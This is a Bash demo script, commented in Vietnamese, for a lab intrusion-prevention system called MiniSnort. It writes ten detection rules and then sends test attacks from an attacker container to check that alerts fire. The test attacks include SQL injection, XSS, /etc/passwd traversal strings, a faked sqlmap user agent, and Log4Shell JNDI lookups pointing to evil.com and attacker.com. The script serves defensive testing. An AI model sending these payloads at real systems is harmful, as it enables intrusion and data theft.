#!/bin/bash
set -e

# Script tự động tạo rules và demo MiniSnort IPS
# Chạy: ./demo_auto_create_rules.sh

echo "=========================================="
echo " MiniSnort IPS - Auto Demo Script"
echo " Tự động tạo rules và test"
echo "=========================================="
echo ""

# Màu sắc
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_error() {
    echo -e "${RED}[✗]${NC} $1"
}

# Kiểm tra containers đang chạy
log_info "Kiểm tra containers..."
if ! docker ps | grep -q ms_ips; then
    log_error "Container ms_ips không chạy. Chạy: docker compose up -d"
    exit 1
fi
log_success "Containers đang chạy"

# Backup rules cũ
log_info "Backup rules cũ..."
if [ -f config/rules/local.rules ]; then
    sudo cp config/rules/local.rules config/rules/local.rules.backup.$(date +%Y%m%d_%H%M%S)
    log_success "Đã backup rules cũ"
fi

# Tạo file rules mới (KHÔNG dùng classtype và priority)
log_info "Tạo file rules mới..."
sudo bash -c 'cat > config/rules/local.rules << EOF
# MiniSnort IPS Rules - Auto Demo
# Tạo tự động: $(date)
# LƯU Ý: MiniSnort KHÔNG hỗ trợ classtype và priority

# Rule 1: ICMP Ping Detection
alert icmp any any -> any any (msg:"ICMP Ping detected"; sid:1000001; rev:1;)

# Rule 2: Block All ICMP (DROP)
drop icmp any any -> any any (msg:"Block all ICMP"; sid:1000002; rev:1;)

# Rule 3: Nmap SYN Scan Detection
alert tcp any any -> any any (msg:"Nmap SYN scan detected"; flags:S; threshold:type threshold, track by_src, count 10, seconds 5; sid:1000003; rev:1;)

# Rule 4: SSH Brute Force Detection
alert tcp any any -> any 22 (msg:"SSH brute force attempt"; flags:S; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000004; rev:1;)

# Rule 5: SQL Injection Detection
alert tcp any any -> any 80 (msg:"SQL Injection attempt detected"; content:"union"; nocase; content:"select"; nocase; distance:0; sid:1000005; rev:1;)

# Rule 6: Admin Panel Access Detection
alert tcp any any -> any 80 (msg:"Admin panel access attempt"; content:"/admin"; sid:1000006; rev:1;)

# Rule 7: XSS Detection
alert tcp any any -> any 80 (msg:"XSS attack detected"; content:"<script"; nocase; sid:1000007; rev:1;)

# Rule 8: Directory Traversal Detection
alert tcp any any -> any 80 (msg:"Directory traversal attempt"; content:"../"; sid:1000008; rev:1;)

# Rule 9: SQLMap Detection
alert tcp any any -> any 80 (msg:"SQLMap automated attack detected"; content:"sqlmap"; nocase; sid:1000009; rev:1;)

# Rule 10: Log4Shell Detection (CVE-2021-44228)
alert tcp any any -> any any (msg:"Log4Shell exploit attempt"; content:"jndi"; nocase; sid:1000010; rev:1;)
EOF'

log_success "Đã tạo 10 rules"

# Restart IPS
log_info "Restart IPS để load rules..."
docker restart ms_ips > /dev/null 2>&1
sleep 5

# Kiểm tra rules đã load
RULES_LOADED=$(docker logs ms_ips 2>&1 | grep "Loaded.*rules" | tail -1)
if [ -n "$RULES_LOADED" ]; then
    log_success "$RULES_LOADED"
else
    log_error "Không thể load rules. Kiểm tra: docker logs ms_ips"
    exit 1
fi

echo ""
echo "=========================================="
echo " BẮT ĐẦU DEMO TỰ ĐỘNG"
echo "=========================================="
echo ""

# Clear log cũ
log_info "Xóa log cũ..."
docker exec ms_ips truncate -s 0 /var/log/minisnort/alert.log 2>/dev/null || true
sleep 1

# Demo Rule 1 & 2: ICMP Ping + Block
echo ""
log_info "[1/10] Testing ICMP Ping Detection + Block..."
docker exec ms_attacker ping -c 3 10.100.0.20 > /dev/null 2>&1 || true
sleep 2
ICMP_COUNT=$(docker exec ms_ips grep -c "ICMP" /var/log/minisnort/alert.log 2>/dev/null || echo "0")
if [ "$ICMP_COUNT" -gt 0 ]; then
    log_success "Phát hiện $ICMP_COUNT ICMP alerts (ping bị chặn)"
else
    log_warning "Không có ICMP alert"
fi

# Demo Rule 3: Nmap SYN Scan
echo ""
log_info "[2/10] Testing Nmap SYN Scan Detection..."
docker exec ms_attacker nmap -sS -p 1-100 10.100.0.20 > /dev/null 2>&1 || true
sleep 2
NMAP_COUNT=$(docker exec ms_ips grep -c "Nmap SYN" /var/log/minisnort/alert.log 2>/dev/null || echo "0")
if [ "$NMAP_COUNT" -gt 0 ]; then
    log_success "Phát hiện $NMAP_COUNT Nmap SYN scan alerts"
else
    log_warning "Không có Nmap alert"
fi

# Demo Rule 4: SSH Brute Force
echo ""
log_info "[3/10] Testing SSH Brute Force Detection..."
for i in {1..10}; do
    docker exec ms_attacker nmap -p 22 10.100.0.20 > /dev/null 2>&1 &
done
wait
sleep 2
SSH_COUNT=$(docker exec ms_ips grep -c "SSH brute force" /var/log/minisnort/alert.log 2>/dev/null || echo "0")
if [ "$SSH_COUNT" -gt 0 ]; then
    log_success "Phát hiện $SSH_COUNT SSH brute force alerts"
else
    log_warning "Không có SSH brute force alert"
fi

# Demo Rule 5: SQL Injection
echo ""
log_info "[4/10] Testing SQL Injection Detection..."
docker exec ms_attacker curl -s "http://10.100.0.20/login.php?id=1' UNION SELECT 1,2,3--" > /dev/null 2>&1 || true
docker exec ms_attacker curl -s "http://10.100.0.20/test?q=union select * from users" > /dev/null 2>&1 || true
sleep 2
SQLI_COUNT=$(docker exec ms_ips grep -c "SQL Injection" /var/log/minisnort/alert.log 2>/dev/null || echo "0")
if [ "$SQLI_COUNT" -gt 0 ]; then
    log_success "Phát hiện $SQLI_COUNT SQL Injection alerts"
else
    log_warning "Không có SQL Injection alert"
fi

# Demo Rule 6: Admin Access
echo ""
log_info "[5/10] Testing Admin Panel Access Detection..."
docker exec ms_attacker curl -s http://10.100.0.20/admin/ > /dev/null 2>&1 || true
docker exec ms_attacker curl -s http://10.100.0.20/administrator/ > /dev/null 2>&1 || true
docker exec ms_attacker curl -s http://10.100.0.20/wp-admin/ > /dev/null 2>&1 || true
sleep 2
ADMIN_COUNT=$(docker exec ms_ips grep -c "Admin panel" /var/log/minisnort/alert.log 2>/dev/null || echo "0")
if [ "$ADMIN_COUNT" -gt 0 ]; then
    log_success "Phát hiện $ADMIN_COUNT Admin access alerts"
else
    log_warning "Không có Admin access alert"
fi

# Demo Rule 7: XSS
echo ""
log_info "[6/10] Testing XSS Detection..."
docker exec ms_attacker curl -s "http://10.100.0.20/search.php?q=<script>alert('XSS')</script>" > /dev/null 2>&1 || true
docker exec ms_attacker curl -s "http://10.100.0.20/comment?text=<SCRIPT>alert(1)</SCRIPT>" > /dev/null 2>&1 || true
sleep 2
XSS_COUNT=$(docker exec ms_ips grep -c "XSS attack" /var/log/minisnort/alert.log 2>/dev/null || echo "0")
if [ "$XSS_COUNT" -gt 0 ]; then
    log_success "Phát hiện $XSS_COUNT XSS alerts"
else
    log_warning "Không có XSS alert"
fi

# Demo Rule 8: Directory Traversal
echo ""
log_info "[7/10] Testing Directory Traversal Detection..."
docker exec ms_attacker curl -s "http://10.100.0.20/download.php?file=../../../../etc/passwd" > /dev/null 2>&1 || true
docker exec ms_attacker curl -s "http://10.100.0.20/view?page=../../config.php" > /dev/null 2>&1 || true
sleep 2
TRAV_COUNT=$(docker exec ms_ips grep -c "Directory traversal" /var/log/minisnort/alert.log 2>/dev/null || echo "0")
if [ "$TRAV_COUNT" -gt 0 ]; then
    log_success "Phát hiện $TRAV_COUNT Directory traversal alerts"
else
    log_warning "Không có Directory traversal alert"
fi

# Demo Rule 9: SQLMap
echo ""
log_info "[8/10] Testing SQLMap Detection..."
docker exec ms_attacker curl -s -A "sqlmap/1.6.12" http://10.100.0.20/ > /dev/null 2>&1 || true
docker exec ms_attacker curl -s -A "sqlmap/1.0" http://10.100.0.20/login.php > /dev/null 2>&1 || true
sleep 2
SQLMAP_COUNT=$(docker exec ms_ips grep -c "SQLMap" /var/log/minisnort/alert.log 2>/dev/null || echo "0")
if [ "$SQLMAP_COUNT" -gt 0 ]; then
    log_success "Phát hiện $SQLMAP_COUNT SQLMap alerts"
else
    log_warning "Không có SQLMap alert"
fi

# Demo Rule 10: Log4Shell
echo ""
log_info "[9/10] Testing Log4Shell Detection..."
docker exec ms_attacker curl -s -H "X-Api-Version: \${jndi:ldap://evil.com/a}" http://10.100.0.20/ > /dev/null 2>&1 || true
docker exec ms_attacker curl -s "http://10.100.0.20/search?q=\${jndi:rmi://attacker.com/Evil}" > /dev/null 2>&1 || true
sleep 2
LOG4J_COUNT=$(docker exec ms_ips grep -c "Log4Shell" /var/log/minisnort/alert.log 2>/dev/null || echo "0")
if [ "$LOG4J_COUNT" -gt 0 ]; then
    log_success "Phát hiện $LOG4J_COUNT Log4Shell alerts"
else
    log_warning "Không có Log4Shell alert"
fi

# Tổng kết
echo ""
echo "=========================================="
echo " KẾT QUẢ DEMO"
echo "=========================================="
echo ""

TOTAL_ALERTS=$(docker exec ms_ips wc -l < /var/log/minisnort/alert.log 2>/dev/null || echo "0")
log_info "Tổng số alerts: $TOTAL_ALERTS"

echo ""
log_info "Top 5 rules phát hiện nhiều nhất:"
docker exec ms_ips cat /var/log/minisnort/alert.log 2>/dev/null | \
    grep -oP '\[1:\d+:\d+\] [^\[]+' | \
    sort | uniq -c | sort -rn | head -5 | \
    while read count rule; do
        echo "  $count lần - $rule"
    done

echo ""
log_info "Xem chi tiết alerts:"
echo "  docker exec ms_ips tail -50 /var/log/minisnort/alert.log"

echo ""
log_info "Mở dashboard:"
echo "  firefox http://127.0.0.1:8080"

echo ""
log_info "Xem rules hiện tại:"
echo "  sudo cat config/rules/local.rules"

echo ""
log_success "Demo hoàn tất! 🎉"
echo ""
